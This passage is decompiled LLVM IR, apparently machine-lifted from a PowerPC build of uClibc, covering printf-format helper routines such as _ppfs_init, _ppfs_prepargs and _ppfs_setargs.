  br i1 %v3_1000db54, label %dec_label_pc_1000db70, label %dec_label_pc_1000db68

dec_label_pc_1000db68:                            ; preds = %dec_label_pc_1000db4c
  %v0_1000db58 = load i32, i32* %r24.global-to-local, align 4
  store i32 268491628, i32* @lr, align 4
  %v3_1000db68 = inttoptr i32 %v0_1000db58 to i16*
  %v4_1000db68 = call i32 @__stdio_fwrite(i32 %v2_1000da2c, i32 %v0_1000db4c, i16* %v3_1000db68)
  store i32 %v4_1000db68, i32* %r0.global-to-local, align 4
  %v1_1000db70.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000db70

dec_label_pc_1000db70:                            ; preds = %dec_label_pc_1000db4c, %dec_label_pc_1000db68
  %v1_1000db70 = phi i32 [ 0, %dec_label_pc_1000db4c ], [ %v1_1000db70.pre, %dec_label_pc_1000db68 ]
  %v0_1000db74 = phi i32 [ 0, %dec_label_pc_1000db4c ], [ %v4_1000db68, %dec_label_pc_1000db68 ]
  %v4_1000db70 = icmp eq i32 %v0_1000db74, %v1_1000db70
  %v1_1000db74 = load i32, i32* @r31, align 4
  %v2_1000db74 = sub i32 %v1_1000db74, %v0_1000db74
  store i32 %v2_1000db74, i32* @r31, align 4
  br i1 %v4_1000db70, label %dec_label_pc_1000db7c, label %dec_label_pc_1000dbc8

dec_label_pc_1000db7c:                            ; preds = %dec_label_pc_1000db70, %dec_label_pc_1000db38
  %v0_1000db94 = phi i32 [ %v2_1000db74, %dec_label_pc_1000db70 ], [ %v0_1000db7c.pre, %dec_label_pc_1000db38 ]
  %v3_1000db7c = icmp eq i32 %v0_1000db94, 0
  store i32 %v2_1000da2c, i32* @r29, align 4
  store i32 %v2_1000d94c, i32* @r4, align 4
  store i32 %v2_1000d950, i32* @r6, align 4
  store i32 %v2_1000da2c, i32* @r3, align 4
  store i32 %v0_1000db94, i32* @r5, align 4
  br i1 %v3_1000db7c, label %dec_label_pc_1000db9c, label %dec_label_pc_1000db44

dec_label_pc_1000db9c:                            ; preds = %dec_label_pc_1000db7c, %dec_label_pc_1000db2c.thread, %dec_label_pc_1000db2c
  %v0_1000db9c = load i32, i32* %r24.global-to-local, align 4
  %v0_1000dba4 = load i32, i32* @r28, align 4
  store i32 268491692, i32* @lr, align 4
  %v4_1000dba8 = call i32 @_charpad(i32 %v0_1000db9c, i8 32, i32 %v0_1000dba4)
  %v1_1000dbac = load i32, i32* @r28, align 4
  %v4_1000dbac = icmp eq i32 %v4_1000dba8, %v1_1000dbac
  br i1 %v4_1000dbac, label %dec_label_pc_1000dbb4, label %dec_label_pc_1000dbc8

dec_label_pc_1000dbb4:                            ; preds = %dec_label_pc_1000db9c, %dec_label_pc_1000d904, %dec_label_pc_1000d6d8
  %stack_var_-184.2 = phi i32 [ %v0_1000d80c, %dec_label_pc_1000d6d8 ], [ %stack_var_-184.1, %dec_label_pc_1000db9c ], [ %v0_1000d80c, %dec_label_pc_1000d904 ]
  %v3_1000dbb4 = load i8*, i8** %stack_var_-200, align 4
  %v4_1000dbb4 = ptrtoint i8* %v3_1000dbb4 to i32
  store i32 %v4_1000dbb4, i32* @r29, align 4
  br label %dec_label_pc_1000dbb8

dec_label_pc_1000dbb8:                            ; preds = %dec_label_pc_1000d5cc, %dec_label_pc_1000dbb4
  %v0_1000dbb8 = phi i32 [ %v0_1000dbb8.pre, %dec_label_pc_1000d5cc ], [ %v4_1000dbb4, %dec_label_pc_1000dbb4 ]
  %v0_1000d80c = phi i32 [ %tmp56, %dec_label_pc_1000d5cc ], [ %stack_var_-184.2, %dec_label_pc_1000dbb4 ]
  br label %dec_label_pc_1000d5e4

dec_label_pc_1000dbc8:                            ; preds = %dec_label_pc_1000da20, %dec_label_pc_1000db9c, %dec_label_pc_1000db2c, %dec_label_pc_1000dad8, %dec_label_pc_1000dabc, %dec_label_pc_1000d97c, %dec_label_pc_1000d94c, %dec_label_pc_1000d8e0, %dec_label_pc_1000d620, %dec_label_pc_1000db70
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000dbcc

dec_label_pc_1000dbcc:                            ; preds = %dec_label_pc_1000d62c, %dec_label_pc_1000d5a4, %dec_label_pc_1000d5bc, %dec_label_pc_1000dbc8
  store i32 %v0_1000d578, i32* %r0.global-to-local, align 4
  %v0_1000dbd0 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_1000dbd0

; uselistorder directives
  uselistorder i32 %v0_1000d80c, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_1000db94, { 1, 2, 0 }
  uselistorder i32 %v1_1000daa8, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_1000da38, { 1, 0 }
  uselistorder i32 %v2_1000d9c8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000d928, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000d80c, { 1, 0 }
  uselistorder i32 %v6_1000d7c4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v1_1000d794, { 1, 0 }
  uselistorder i32 %v1_1000d738, { 1, 0 }
  uselistorder i1 %v2_1000d72c, { 1, 0 }
  uselistorder i32 %v0_1000d6dc, { 1, 0, 2 }
  uselistorder i32 %v1_1000d6c8, { 1, 0 }
  uselistorder i32 %v0_1000d6c0, { 1, 0 }
  uselistorder i32 %v1_1000d6bc, { 1, 0 }
  uselistorder i32 %v1_1000d638, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000d600, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000d610, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_1000da2c, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v2_1000d674, { 1, 2, 0 }
  uselistorder i32 %v4_1000d66c, { 1, 0 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 5, 7, 6, 0, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 0, 1, 5, 4 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i8 32, { 2, 1, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_1000dbcc, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000dbc8, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_1000dbb8, { 1, 0 }
  uselistorder label %dec_label_pc_1000db9c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000db70, { 1, 0 }
  uselistorder label %dec_label_pc_1000db4c, { 1, 0 }
  uselistorder label %dec_label_pc_1000dad8, { 1, 0 }
  uselistorder label %dec_label_pc_1000dab0, { 1, 0 }
  uselistorder label %dec_label_pc_1000da98, { 1, 0 }
  uselistorder label %dec_label_pc_1000da84, { 1, 0 }
  uselistorder label %dec_label_pc_1000da64, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000da64thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000da58, { 1, 0 }
  uselistorder label %dec_label_pc_1000d9e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d9d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d94c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d89c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d884, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_1000d834, { 1, 0 }
  uselistorder label %dec_label_pc_1000d818, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1000d7a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d788, { 1, 0 }
  uselistorder label %dec_label_pc_1000d774, { 1, 0 }
  uselistorder label %dec_label_pc_1000d770, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d744, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d6cc, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000d690, { 1, 0 }
  uselistorder label %dec_label_pc_1000d62c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d620, { 1, 0 }
  uselistorder label %dec_label_pc_1000d5e4, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1000dbe8 = load i32, i32* @lr, align 4
  store i32 %v0_1000dbe8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000dbf8 = load i32, i32* @r4, align 4
  store i32 %v0_1000dbf8, i32* @r30, align 4
  store i32 268491784, i32* @lr, align 4
  %v3_1000dc04 = call i32 @__GI_memset(i32 0, i32 160, i32 160)
  %v0_1000dc08 = load i32, i32* @r31, align 4
  %v1_1000dc08 = add i32 %v0_1000dc08, 24
  %v2_1000dc08 = inttoptr i32 %v1_1000dc08 to i32*
  %v3_1000dc08 = load i32, i32* %v2_1000dc08, align 4
  store i32 %v3_1000dc08, i32* %r9.global-to-local, align 4
  store i32 9, i32* %r11.global-to-local, align 4
  %v0_1000dc10 = load i32, i32* @r30, align 4
  %v2_1000dc10 = inttoptr i32 %v0_1000dc08 to i32*
  store i32 %v0_1000dc10, i32* %v2_1000dc10, align 4
  %v0_1000dc14 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000dc14, i32* %ctr.global-to-local, align 4
  %v0_1000dc18 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000dc18 = add i32 %v0_1000dc18, -1
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_1000dc20 = load i32, i32* @r31, align 4
  %v2_1000dc20 = add i32 %v1_1000dc20, 24
  %v3_1000dc20 = inttoptr i32 %v2_1000dc20 to i32*
  store i32 %v1_1000dc18, i32* %v3_1000dc20, align 4
  %v0_1000dc24 = load i32, i32* @r31, align 4
  %v1_1000dc24 = add i32 %v0_1000dc24, 40
  store i32 %v1_1000dc24, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000dc28

dec_label_pc_1000dc28:                            ; preds = %dec_label_pc_1000dc28, %entry
  %v1_1000dc28 = phi i32 [ %v1_1000dc2c, %dec_label_pc_1000dc28 ], [ %v1_1000dc24, %entry ]
  %v0_1000dc28 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000dc28 = inttoptr i32 %v1_1000dc28 to i32*
  store i32 %v0_1000dc28, i32* %v2_1000dc28, align 4
  %v0_1000dc2c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000dc2c = add i32 %v0_1000dc2c, 4
  store i32 %v1_1000dc2c, i32* %r9.global-to-local, align 4
  %v0_1000dc30 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000dc30 = add i32 %v0_1000dc30, -1
  store i32 %v1_1000dc30, i32* %ctr.global-to-local, align 4
  %v2_1000dc30 = icmp eq i32 %v1_1000dc30, 0
  br i1 %v2_1000dc30, label %dec_label_pc_1000dc34, label %dec_label_pc_1000dc28

dec_label_pc_1000dc34:                            ; preds = %dec_label_pc_1000dc28
  %v0_1000dc34 = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000dc74

dec_label_pc_1000dc44:                            ; preds = %dec_label_pc_1000dc74
  %v3_1000dc7c = icmp eq i8 %v2_1000dc74, 37
  br i1 %v3_1000dc7c, label %dec_label_pc_1000dc48, label %dec_label_pc_1000dc70

dec_label_pc_1000dc48:                            ; preds = %dec_label_pc_1000dc44
  %v1_1000dc48 = add i32 %v0_1000dc48, 1
  %v2_1000dc48 = inttoptr i32 %v1_1000dc48 to i8*
  %v3_1000dc48 = load i8, i8* %v2_1000dc48, align 1
  %v4_1000dc48 = zext i8 %v3_1000dc48 to i32
  store i32 %v4_1000dc48, i32* %r0.global-to-local, align 4
  store i32 %v1_1000dc48, i32* %r9.global-to-local, align 4
  %v3_1000dc50 = icmp eq i8 %v3_1000dc48, 37
  br i1 %v3_1000dc50, label %dec_label_pc_1000dc70, label %dec_label_pc_1000dc58

dec_label_pc_1000dc58:                            ; preds = %dec_label_pc_1000dc48
  %v0_1000dc4c = load i32, i32* @r31, align 4
  %v2_1000dc58 = inttoptr i32 %v0_1000dc4c to i32*
  store i32 %v1_1000dc48, i32* %v2_1000dc58, align 4
  store i32 268491872, i32* @lr, align 4
  %v1_1000dc5c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000dc5c = call i32 @_ppfs_parsespec(i32* %v2_1000dc58, i32 %v1_1000dc5c)
  %v1_1000dc60 = icmp slt i32 %v3_1000dc5c, 0
  br i1 %v1_1000dc60, label %dec_label_pc_1000dc8c, label %dec_label_pc_1000dc68

dec_label_pc_1000dc68:                            ; preds = %dec_label_pc_1000dc58
  %v0_1000dc68 = load i32, i32* @r31, align 4
  %v1_1000dc68 = inttoptr i32 %v0_1000dc68 to i32*
  %v2_1000dc68 = load i32, i32* %v1_1000dc68, align 4
  br label %dec_label_pc_1000dc74

dec_label_pc_1000dc70:                            ; preds = %dec_label_pc_1000dc44, %dec_label_pc_1000dc48
  %v0_1000dc70 = phi i32 [ %v0_1000dc48, %dec_label_pc_1000dc44 ], [ %v1_1000dc48, %dec_label_pc_1000dc48 ]
  %v1_1000dc70 = add i32 %v0_1000dc70, 1
  br label %dec_label_pc_1000dc74

dec_label_pc_1000dc74:                            ; preds = %dec_label_pc_1000dc68, %dec_label_pc_1000dc70, %dec_label_pc_1000dc34
  %v0_1000dc48 = phi i32 [ %v0_1000dc34, %dec_label_pc_1000dc34 ], [ %v1_1000dc70, %dec_label_pc_1000dc70 ], [ %v2_1000dc68, %dec_label_pc_1000dc68 ]
  store i32 %v0_1000dc48, i32* %r9.global-to-local, align 4
  %v1_1000dc74 = inttoptr i32 %v0_1000dc48 to i8*
  %v2_1000dc74 = load i8, i8* %v1_1000dc74, align 1
  %v3_1000dc74 = zext i8 %v2_1000dc74 to i32
  store i32 %v3_1000dc74, i32* %r0.global-to-local, align 4
  %v3_1000dc78 = icmp eq i8 %v2_1000dc74, 0
  br i1 %v3_1000dc78, label %dec_label_pc_1000dc84, label %dec_label_pc_1000dc44

dec_label_pc_1000dc84:                            ; preds = %dec_label_pc_1000dc74
  %v0_1000dc84 = load i32, i32* @r30, align 4
  %v1_1000dc84 = load i32, i32* @r31, align 4
  %v2_1000dc84 = inttoptr i32 %v1_1000dc84 to i32*
  store i32 %v0_1000dc84, i32* %v2_1000dc84, align 4
  br label %dec_label_pc_1000dc8c

dec_label_pc_1000dc8c:                            ; preds = %dec_label_pc_1000dc58, %dec_label_pc_1000dc84
  %storemerge = phi i32 [ 0, %dec_label_pc_1000dc84 ], [ -1, %dec_label_pc_1000dc58 ]
  store i32 %v0_1000dbe8, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_1000dc74, { 1, 2, 0 }
  uselistorder i32 %v0_1000dc48, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000dc30, { 1, 0 }
  uselistorder i32 %v1_1000dc2c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000dc8c, { 1, 0 }
  uselistorder label %dec_label_pc_1000dc74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000dc70, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000dca0 = load i32, i32* @lr, align 4
  %v0_1000dca8 = load i32, i32* @r3, align 4
  store i32 %v0_1000dca8, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000dcc4 = add i32 %v0_1000dca8, 24
  %v2_1000dcc4 = inttoptr i32 %v1_1000dcc4 to i32*
  %v3_1000dcc4 = load i32, i32* %v2_1000dcc4, align 4
  store i32 %v3_1000dcc4, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_1000dcc4, 1
  br i1 %tmp4, label %dec_label_pc_1000dce8, label %dec_label_pc_1000dcd0

dec_label_pc_1000dcd0:                            ; preds = %entry
  %v2_1000dcd0 = add i32 %v0_1000dca8, 8
  %v3_1000dcd0 = inttoptr i32 %v2_1000dcd0 to i32*
  store i32 0, i32* %v3_1000dcd0, align 4
  %v0_1000dcd4 = load i32, i32* @r30, align 4
  %v1_1000dcd4 = load i32, i32* @r3, align 4
  %v2_1000dcd4 = add i32 %v1_1000dcd4, 28
  %v3_1000dcd4 = inttoptr i32 %v2_1000dcd4 to i32*
  store i32 %v0_1000dcd4, i32* %v3_1000dcd4, align 4
  %v0_1000dcd8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000dcd8 = load i32, i32* @r3, align 4
  %v2_1000dcd8 = add i32 %v1_1000dcd8, 24
  %v3_1000dcd8 = inttoptr i32 %v2_1000dcd8 to i32*
  store i32 %v0_1000dcd8, i32* %v3_1000dcd8, align 4
  %v0_1000dcdc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000dcdc = load i32, i32* @r3, align 4
  %v2_1000dcdc = add i32 %v1_1000dcdc, 4
  %v3_1000dcdc = inttoptr i32 %v2_1000dcdc to i32*
  store i32 %v0_1000dcdc, i32* %v3_1000dcdc, align 4
  store i32 268492004, i32* @lr, align 4
  %v0_1000dce0 = call i32 @_ppfs_setargs()
  store i32 %v0_1000dce0, i32* %r3.global-to-local, align 4
  %v0_1000dce4 = load i32, i32* @r30, align 4
  %v1_1000dce4 = load i32, i32* @r31, align 4
  %v2_1000dce4 = add i32 %v1_1000dce4, 24
  %v3_1000dce4 = inttoptr i32 %v2_1000dce4 to i32*
  store i32 %v0_1000dce4, i32* %v3_1000dce4, align 4
  %v0_1000dcf8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000dce8

dec_label_pc_1000dce8:                            ; preds = %entry, %dec_label_pc_1000dcd0
  %v0_1000dcf8 = phi i32 [ %v0_1000dca8, %entry ], [ %v0_1000dcf8.pre, %dec_label_pc_1000dcd0 ]
  store i32 %v0_1000dca0, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000dcf8

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_1000dce8, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000dcfc = load i32, i32* @r3, align 4
  %v1_1000dcfc = add i32 %v0_1000dcfc, 24
  %v2_1000dcfc = inttoptr i32 %v1_1000dcfc to i32*
  %v3_1000dcfc = load i32, i32* %v2_1000dcfc, align 4
  store i32 %v3_1000dcfc, i32* %r0.global-to-local, align 4
  %v1_1000dd00 = add i32 %v0_1000dcfc, 88
  store i32 %v1_1000dd00, i32* @r8, align 4
  %v1_1000dd04 = add i32 %v0_1000dcfc, 8
  %v2_1000dd04 = inttoptr i32 %v1_1000dd04 to i32*
  %v3_1000dd04 = load i32, i32* %v2_1000dd04, align 4
  store i32 %v3_1000dd04, i32* %r9.global-to-local, align 4
  %v2_1000dd08 = icmp sgt i32 %v3_1000dcfc, 0
  %v3_1000dd08 = icmp eq i32 %v3_1000dcfc, 0
  store i1 %v2_1000dd08, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000dd08, label %dec_label_pc_1000dd10, label %dec_label_pc_1000defc

dec_label_pc_1000dd10:                            ; preds = %entry
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_1000dd14 = icmp ne i32 %v3_1000dd04, -2147483648
  %v4_1000dd14 = icmp eq i32 %v3_1000dd04, -2147483648
  store i1 %v3_1000dd14, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000dd14, label %dec_label_pc_1000dd1c, label %dec_label_pc_1000dd5c

dec_label_pc_1000dd1c:                            ; preds = %dec_label_pc_1000dd10
  %v1_1000dd1c = add i32 %v0_1000dcfc, 76
  %v2_1000dd1c = inttoptr i32 %v1_1000dd1c to i8*
  %v3_1000dd1c = load i8, i8* %v2_1000dd1c, align 1
  %v4_1000dd1c = zext i8 %v3_1000dd1c to i32
  store i32 %v4_1000dd1c, i32* %r10.global-to-local, align 4
  store i32 %v1_1000dd1c, i32* %r11.global-to-local, align 4
  %v2_1000dd24 = icmp ugt i8 %v3_1000dd1c, 8
  store i1 %v2_1000dd24, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_1000dd1c, 7
  br i1 %tmp, label %dec_label_pc_1000dd44, label %dec_label_pc_1000dd2c

dec_label_pc_1000dd2c:                            ; preds = %dec_label_pc_1000dd1c
  %v1_1000dd2c = add i32 %v0_1000dcfc, 84
  %v2_1000dd2c = inttoptr i32 %v1_1000dd2c to i32*
  %v3_1000dd2c = load i32, i32* %v2_1000dd2c, align 4
  %v1_1000dd30 = mul nuw nsw i32 %v4_1000dd1c, 4
  %v2_1000dd34 = add i32 %v3_1000dd2c, %v1_1000dd30
  store i32 %v2_1000dd34, i32* %r9.global-to-local, align 4
  %v1_1000dd38 = add nuw nsw i32 %v4_1000dd1c, 1
  store i32 %v1_1000dd38, i32* %r0.global-to-local, align 4
  %v1_1000dd3c = trunc i32 %v1_1000dd38 to i8
  store i8 %v1_1000dd3c, i8* %v2_1000dd1c, align 1
  br label %dec_label_pc_1000dd50

dec_label_pc_1000dd44:                            ; preds = %dec_label_pc_1000dd1c
  %v1_1000dd44 = add i32 %v0_1000dcfc, 80
  %v2_1000dd44 = inttoptr i32 %v1_1000dd44 to i32*
  %v3_1000dd44 = load i32, i32* %v2_1000dd44, align 4
  store i32 %v3_1000dd44, i32* %r9.global-to-local, align 4
  %v1_1000dd48 = add i32 %v3_1000dd44, 4
  store i32 %v1_1000dd48, i32* %r0.global-to-local, align 4
  store i32 %v1_1000dd48, i32* %v2_1000dd44, align 4
  br label %dec_label_pc_1000dd50

dec_label_pc_1000dd50:                            ; preds = %dec_label_pc_1000dd2c, %dec_label_pc_1000dd44
  %v0_1000dd50 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000dd50 = inttoptr i32 %v0_1000dd50 to i32*
  %v2_1000dd50 = load i32, i32* %v1_1000dd50, align 4
  store i32 %v2_1000dd50, i32* %r0.global-to-local, align 4
  %v1_1000dd54 = load i32, i32* @r8, align 4
  %v2_1000dd54 = inttoptr i32 %v1_1000dd54 to i32*
  store i32 %v2_1000dd50, i32* %v2_1000dd54, align 4
  %v0_1000dd58 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000dd58 = load i32, i32* @r3, align 4
  %v2_1000dd58 = add i32 %v1_1000dd58, 8
  %v3_1000dd58 = inttoptr i32 %v2_1000dd58 to i32*
  store i32 %v0_1000dd58, i32* %v3_1000dd58, align 4
  %v0_1000dd5c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000dd5c

dec_label_pc_1000dd5c:                            ; preds = %dec_label_pc_1000dd10, %dec_label_pc_1000dd50
  %v2_1000dd8c = phi i32 [ %v0_1000dcfc, %dec_label_pc_1000dd10 ], [ %v0_1000dd5c.pre, %dec_label_pc_1000dd50 ]
  %v1_1000dd5c = add i32 %v2_1000dd8c, 4
  %v2_1000dd5c = inttoptr i32 %v1_1000dd5c to i32*
  %v3_1000dd5c = load i32, i32* %v2_1000dd5c, align 4
  store i32 %v3_1000dd5c, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_1000dd64 = icmp ne i32 %v3_1000dd5c, -2147483648
  %v4_1000dd64 = icmp eq i32 %v3_1000dd5c, -2147483648
  store i1 %v3_1000dd64, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000dd64, label %dec_label_pc_1000dd6c, label %dec_label_pc_1000deec.preheader

dec_label_pc_1000dd6c:                            ; preds = %dec_label_pc_1000dd5c
  %v1_1000dd6c = add i32 %v2_1000dd8c, 76
  %v2_1000dd6c = inttoptr i32 %v1_1000dd6c to i8*
  %v3_1000dd6c = load i8, i8* %v2_1000dd6c, align 1
  %v4_1000dd6c = zext i8 %v3_1000dd6c to i32
  store i32 %v4_1000dd6c, i32* %r10.global-to-local, align 4
  store i32 %v1_1000dd6c, i32* %r11.global-to-local, align 4
  %v2_1000dd74 = icmp ugt i8 %v3_1000dd6c, 8
  store i1 %v2_1000dd74, i1* %cr7_gt.global-to-local, align 1
  %tmp22 = icmp ugt i8 %v3_1000dd6c, 7
  br i1 %tmp22, label %dec_label_pc_1000dd94, label %dec_label_pc_1000dd7c

dec_label_pc_1000dd7c:                            ; preds = %dec_label_pc_1000dd6c
  %v1_1000dd7c = add i32 %v2_1000dd8c, 84
  %v2_1000dd7c = inttoptr i32 %v1_1000dd7c to i32*
  %v3_1000dd7c = load i32, i32* %v2_1000dd7c, align 4
  %v1_1000dd80 = mul nuw nsw i32 %v4_1000dd6c, 4
  %v2_1000dd84 = add i32 %v3_1000dd7c, %v1_1000dd80
  store i32 %v2_1000dd84, i32* %r9.global-to-local, align 4
  %v1_1000dd88 = add nuw nsw i32 %v4_1000dd6c, 1
  store i32 %v1_1000dd88, i32* %r0.global-to-local, align 4
  %v1_1000dd8c = trunc i32 %v1_1000dd88 to i8
  store i8 %v1_1000dd8c, i8* %v2_1000dd6c, align 1
  br label %dec_label_pc_1000dda0

dec_label_pc_1000dd94:                            ; preds = %dec_label_pc_1000dd6c
  %v1_1000dd94 = add i32 %v2_1000dd8c, 80
  %v2_1000dd94 = inttoptr i32 %v1_1000dd94 to i32*
  %v3_1000dd94 = load i32, i32* %v2_1000dd94, align 4
  store i32 %v3_1000dd94, i32* %r9.global-to-local, align 4
  %v1_1000dd98 = add i32 %v3_1000dd94, 4
  store i32 %v1_1000dd98, i32* %r0.global-to-local, align 4
  store i32 %v1_1000dd98, i32* %v2_1000dd94, align 4
  br label %dec_label_pc_1000dda0

dec_label_pc_1000dda0:                            ; preds = %dec_label_pc_1000dd7c, %dec_label_pc_1000dd94
  %v0_1000dda0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000dda0 = inttoptr i32 %v0_1000dda0 to i32*
  %v2_1000dda0 = load i32, i32* %v1_1000dda0, align 4
  store i32 %v2_1000dda0, i32* %r0.global-to-local, align 4
  %v1_1000dda4 = load i32, i32* @r8, align 4
  %v2_1000dda4 = inttoptr i32 %v1_1000dda4 to i32*
  store i32 %v2_1000dda0, i32* %v2_1000dda4, align 4
  %v0_1000dda8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000dda8 = load i32, i32* @r3, align 4
  %v2_1000dda8 = add i32 %v1_1000dda8, 4
  %v3_1000dda8 = inttoptr i32 %v2_1000dda8 to i32*
  store i32 %v0_1000dda8, i32* %v3_1000dda8, align 4
  %v0_1000deec5.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000deec.preheader

dec_label_pc_1000deec.preheader:                  ; preds = %dec_label_pc_1000dd5c, %dec_label_pc_1000dda0
  %v0_1000deec5 = phi i32 [ %v2_1000dd8c, %dec_label_pc_1000dd5c ], [ %v0_1000deec5.pre, %dec_label_pc_1000dda0 ]
  store i32 0, i32* @r7, align 4
  %v1_1000deec6 = add i32 %v0_1000deec5, 28
  %v2_1000deec7 = inttoptr i32 %v1_1000deec6 to i32*
  %v3_1000deec8 = load i32, i32* %v2_1000deec7, align 4
  store i32 %v3_1000deec8, i32* %r0.global-to-local, align 4
  %v2_1000def09 = icmp sgt i32 %v3_1000deec8, 0
  %v3_1000def010 = icmp slt i32 %v3_1000deec8, 0
  store i1 %v3_1000def010, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000def09, label %dec_label_pc_1000ddb4, label %dec_label_pc_1000df3c

dec_label_pc_1000ddb4:                            ; preds = %dec_label_pc_1000deec.preheader, %dec_label_pc_1000dee8
  %v2_1000dec8 = phi i32 [ %v0_1000deec, %dec_label_pc_1000dee8 ], [ %v0_1000deec5, %dec_label_pc_1000deec.preheader ]
